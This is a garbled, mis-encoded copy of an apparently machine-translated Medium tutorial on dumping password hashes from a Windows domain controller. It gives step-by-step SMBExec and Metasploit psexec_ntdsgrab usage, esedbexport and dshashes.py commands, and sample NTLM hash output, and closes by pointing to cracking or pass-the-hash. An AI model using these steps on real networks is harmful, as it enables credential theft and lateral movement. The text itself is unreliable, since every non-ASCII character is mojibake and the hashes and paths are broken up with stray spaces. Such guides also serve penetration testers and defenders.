# å¦‚ä½•æ”»å‡»åŸŸæ§åˆ¶å™¨ğŸ¤”ğŸ˜®ğŸ˜®

> åŸæ–‡ï¼š<https://medium.com/codex/how-to-attacking-the-domain-controller-317e61ee6829?source=collection_archive---------17----------------------->

![](img/94b4e37fd57b50f1cc07f1bfd026170a.png)

é©¬å…‹è¥¿å§†Â·éœæ™®æ›¼åœ¨ [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) ä¸Šçš„ç…§ç‰‡

å¦‚æœä½ æœ‰å¹¸è·å¾—äº†ä¸€ä¸ªæœ¬åœ°ç®¡ç†å¸æˆ·æˆ–åŸŸç®¡ç†å¸æˆ·ï¼Œä¸‹ä¸€ä¸ªç›®æ ‡é€šå¸¸æ˜¯åŸŸæ§åˆ¶å™¨(DC)ã€‚å¯¹ä»»ä½•ä¸€ä¸ªåœ£çµé™ä¸´èŠ‚çš„äººæ¥è¯´ï¼Œæœ€å¿«ä¹çš„æ—¶åˆ»ä¹‹ä¸€å°±æ˜¯ä»–ä»¬æˆåŠŸåœ°å°†æ‰€æœ‰çš„å“ˆå¸Œä» DC ä¸­å–å‡ºæ¥ã€‚

å³ä½¿æœ‰ç®¡ç†å‡­è¯ï¼Œæˆ‘ä»¬ä¹Ÿæ— æƒè¯»å–å­˜å‚¨åœ¨ c:\Windows\NTDS\ntds.dit æ–‡ä»¶ä¸­çš„åŸŸæ§åˆ¶å™¨ä¸Šçš„å“ˆå¸Œã€‚è¿™æ˜¯å› ä¸ºå½“ Active Directory ä¸æ–­è®¿é—®è¯¥æ–‡ä»¶æ—¶ï¼Œè¯¥æ–‡ä»¶è¢«è¯»é”å®šã€‚è¿™ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨ Windows ä¸­çš„å·å½±å¤åˆ¶åŠŸèƒ½æ¥åˆ›å»ºè¯¥æ–‡ä»¶çš„å‰¯æœ¬ã€‚

## **SMBExec**

è¿™å°±æ˜¯ SMBExec å·¥å…·å‘æŒ¥ä½œç”¨çš„åœ°æ–¹ã€‚brav0hax åˆ¶ä½œçš„å·¥å…· SMBExec åˆ©ç”¨å·å½±å¤åˆ¶åŠŸèƒ½æŠ“å– SYS reg é”®å’Œ ntds.dit æ–‡ä»¶ã€‚è®©æˆ‘ä»¬æ¥çœ‹çœ‹æˆ‘ä»¬åœ¨è®¾ç½®æ‚¨çš„è®¾å¤‡ä¸€èŠ‚ä¸­å®‰è£…çš„ SMBExec æ¨¡å—ã€‚

> â—è¿è¡Œ SMBExec

> â—‹ cd /opt/smbexec
> 
> â—‹ ./smbexec

> â—ä¸ºè·å–æ•£åˆ—é€‰æ‹© 3
> 
> â—ä¸ºåŸŸæ§åˆ¶å™¨é€‰æ‹© 2
> 
> â—æä¾›ç”¨æˆ·å/å“ˆå¸Œ/åŸŸ/IP/NTDS é©±åŠ¨å™¨/NTDS è·¯å¾„

![](img/3b555aad85ec5a37763ca28569222728.png)

æˆ‘ä»¬åˆšåˆšçœ‹åˆ° SMBExec ä½¿ç”¨æœ‰æ•ˆçš„å‡­æ®ã€ç»è¿‡éªŒè¯çš„è·¯å¾„è¿æ¥åˆ°åŸŸæ§åˆ¶å™¨ï¼Œå¹¶å°è¯•åˆ›å»º ntds.dit å’Œ sys æ–‡ä»¶çš„å·å½±å‰¯æœ¬ã€‚å®Œæˆåï¼ŒSMBExec è¯•å›¾è§£æè¿™äº›æ–‡ä»¶ï¼Œå¹¶æ”¶é›†å’Œå­˜å‚¨æ¥è‡ª LDAP çš„æ‰€æœ‰å¯†ç æ•£åˆ—ã€‚

ä¸€æ—¦ SMBExec å®Œæˆå¹¶æˆåŠŸï¼Œå®ƒå°†æ ¹æ®æ—¥æœŸæ—¶é—´æ ‡è®°åœ¨åŒä¸€ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚å¦‚æœä½ è¿›å…¥è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œä½ ä¼šçœ‹åˆ°ä¸€ä¸ªåä¸º[domain]-dc-hashes.lst çš„æ–‡ä»¶ã€‚

![](img/dd15c26ebd8be488d14e8508e0918b31.png)

åœ¨ç¤ºä¾‹å—æŸçš„åŸŸæ§åˆ¶å™¨ä¸­ï¼Œæˆ‘èƒ½å¤Ÿæ‰¾åˆ°ä»¥ä¸‹ç”¨æˆ·çš„ NTLM å“ˆå¸Œ:

> ç®¡ç†å‘˜:500:aad3b 435 b 51404 eeaad 3 b 435 b 51404 ee:8 B9 e 471 f 83d 355 EDA 6 BF 63524 b 044870:::å®¢äºº:501:aad3b 435 b 51404 eeaad 3 b 435 b 51404 ee:31 D6 cf E0 d 16 a e 931 b 73 c 59d 7 E0 c 089 c 0:::admin _ account:1000:aad 3 B4

è¯·è®°ä½ï¼Œå¦‚æœæ‚¨æ­£åœ¨æŸ¥è¯¢ä¸€ä¸ªå¤§å‹åŸŸæ§åˆ¶å™¨ï¼Œå»å–æ¯å’–å•¡ï¼Œå› ä¸ºè¿™å°†éœ€è¦ç›¸å½“é•¿çš„æ—¶é—´ã€‚åœ¨æ‚¨æ”¶é›†äº†æ‰€æœ‰è¿™äº›æ•£åˆ—ä¹‹åï¼Œæ‚¨å¯ä»¥å¼€å§‹å¯†ç ç ´è§£æˆ–è€…åˆ©ç”¨æ•£åˆ—çš„ä¼ é€’æ¥ç»§ç»­åˆ©ç”¨ç›’å­ã€‚

## **PSExec_NTDSgrab**

å¦ä¸€ç§è½¬å‚¨æ•£åˆ—çš„å¥½æ–¹æ³•æ˜¯ä½¿ç”¨åä¸º psexec_ntdsgrab çš„ metasploit æ¨¡å—ã€‚ä¸ SMBExec ç±»ä¼¼ï¼ŒPSExec_NTDSGrabâ€œå¯¹ Active Directory åŸŸæ§åˆ¶å™¨è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå¹¶åˆ›å»º%SYSTEMDRIVE%çš„å·å½±å‰¯æœ¬ã€‚ç„¶åï¼Œå®ƒä¸‹è½½ ntds.dit æ–‡ä»¶ä»¥åŠç³»ç»Ÿé…ç½®å•å…ƒçš„å‰¯æœ¬å¹¶å­˜å‚¨å®ƒä»¬ã€‚ntds.dit å’Œç³»ç»Ÿé…ç½®å•å…ƒå‰¯æœ¬å¯ä»¥ä¸å…¶ä»–å·¥å…·ç»“åˆä½¿ç”¨ï¼Œç”¨äºç¦»çº¿æå– AD å¯†ç å“ˆå¸Œã€‚æ‰€æœ‰è¿™äº›éƒ½æ˜¯åœ¨ä¸å‘ç›®æ ‡ä¸»æœºä¸Šä¼ ä»»ä½•äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µä¸‹å®Œæˆçš„ã€‚â€

**ä½¿ç”¨æœ¬åœ°/åŸŸç®¡ç†å‘˜å‡­è¯ï¼Œè®©æˆ‘ä»¬è·å–åŸŸæ•£åˆ—:**

> â— msfconsole
> 
> â—ä½¿ç”¨è¾…åŠ©/ç®¡ç†/smb/psexec_ntdsgrab
> 
> â—ç¡®ä¿è®¾ç½® RHOSTã€SMBDomainã€SMBPass å’Œ SMBUser çš„å­—æ®µ
> 
> â—åˆ©ç”¨

![](img/80ca58e77481e47989a1a5ee5df1796d.png)

å¦‚æœæˆåŠŸæŠ“å–äº† NTDS.dit æ–‡ä»¶ï¼ŒMetasploit ä¼šå°†è¯¥æ–‡ä»¶æ”¾åˆ°/root/.ms4/loot/æ–‡ä»¶å¤¹ä¸­ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ esedbtool å’Œ NTDSextract å°† dit æ–‡ä»¶è½¬æ¢æˆå“ˆå¸Œè¡¨ã€‚

## **esedbexport å‘½ä»¤:**

> â—å¦‚ä½•è¿è¡Œ:esedbexport-t[å¯¼å‡ºä½ç½®] [NTDS.dit æ–‡ä»¶]
> 
> â—/opt/esedbtools/esedbexport-t/tmp/NTDs/root/. ms F4/loot/2015 02 14180250 _ default _ 172 . 16 . 151 . 200 _ psexec . NTDs grab . _ 641158ã€‚

![](img/740540e6a83fcd185d04438d3cc586b6.png)

æˆ‘ä»¬éœ€è¦è¿è¡Œ dshashes.py æ¥å°†æˆ‘ä»¬çš„è¡¨è½¬æ¢æˆå¯†ç æ•£åˆ—ã€‚

> å¦‚ä½•è¿è¡Œ:
> 
> â—ds hashes . py[datatable table][link _ table]â€”password hashes[æ¥è‡ª ntdsgrab çš„åŸå§‹ bin æ–‡ä»¶]
> 
> â—python/opt/NTDSXtract/dshashes . py/tmp/NTDs . export/datatable . 4/tmp/NTDs . export/link _ table . 7/tmp/â€”password hashes/root/. ms F4/loot/2015 02 14180253 _ default _ 172 . 16 . 151 . 200 _ psexec . ntdsgrab . _ 127578ã€‚

![](img/df2b762c7663635ed23eed9139ff43ca.png)

è¿™åªæ˜¯è½¬å‚¨åŸŸæ•£åˆ—çš„å¦ä¸€ç§æ–¹å¼ã€‚åœ¨å„ç§æµ‹è¯•ä¸­ï¼Œæˆ‘é‡åˆ°è¿‡ SMBExec æˆ– psexec_ntdsgrab ç”±äºæŸç§å¥‡æ€ªçš„åŸå› è€Œæ— æ³•å·¥ä½œçš„æƒ…å†µã€‚æ¢å¥è¯è¯´ï¼Œæœ‰æ—¶å€™ä¸€ä¸ªå·¥å…·å·¥ä½œï¼Œè€Œå¦ä¸€ä¸ªå·¥å…·ä¸å·¥ä½œã€‚å› æ­¤ï¼Œç¡®ä¿ä½ çš„åå…œé‡Œæœ‰è¿™ä¸¤ç§å·¥å…·ã€‚